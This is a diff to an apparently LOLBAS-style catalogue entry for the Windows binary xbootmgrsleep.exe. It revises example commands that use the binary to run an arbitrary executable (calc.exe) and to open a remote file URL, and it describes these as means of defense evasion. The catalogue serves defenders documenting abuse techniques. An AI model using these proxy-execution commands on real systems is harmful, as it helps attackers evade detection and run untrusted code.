@@ -4,7 +4,7 @@ Description: Windows Performance Toolkit binary used for tracing and analyzing s
 Author: Avihay Eldad
 Created: 2024-06-13
 Commands:
-  - Command: xbootmgrsleep.exe 1000 "{EXE}"
+  - Command: xbootmgrsleep.exe 1000 calc.exe
     Description: Execute executable via XBootMgrSleep, with a 1 second (=1000 milliseconds) delay.
     Usecase: Performs execution of specified executable, can be used as a defense evasion.
     Category: Execute
@@ -13,8 +13,8 @@ Commands:
     OperatingSystem: Windows
     Tags:
       - Execute: EXE
-  - Command: xbootmgrsleep.exe -wakeupaction "{EXE}"
-    Description: Uses the -wakeupaction parameter to execute the specified executable with XBootMgrSleep.
+  - Command: xbootmgrsleep.exe "{ANY_STRING}" calc.exe
+    Description: Execute executable via XBootMgrSleep.
     Usecase: Performs execution of specified executable, can be used as a defense evasion.
     Category: Execute
     Privileges: User
@@ -31,9 +31,9 @@ Commands:
     OperatingSystem: Windows
     Tags:
       - Execute: URL
-  - Command: xbootmgrsleep.exe -wakeupaction https://www.example.org/file.exe
-    Description: Opens the specified URL in the default browser using the -wakeupaction parameter with XBootMgrSleep.
-    Usecase: Can be used to initiate execution of remote content via default protocol handling.
+  - Command: xbootmgrsleep.exe "{ANY_STRING}" https://www.example.org/file.exe
+    Description: Opens the specified URL in the default browser with XBootMgrSleep.
+    Usecase: Can be used to initiate execution of remote content via default protocol handling, potentially bypassing detection mechanisms.
     Category: Execute
     Privileges: User
     MitreID: T1204.001
@@ -50,3 +50,4 @@ Acknowledgement:
     Handle: '@AvihayEldad'
   - Person: Yuval Saban
     Handle: '@yuvalsaban3'
+    
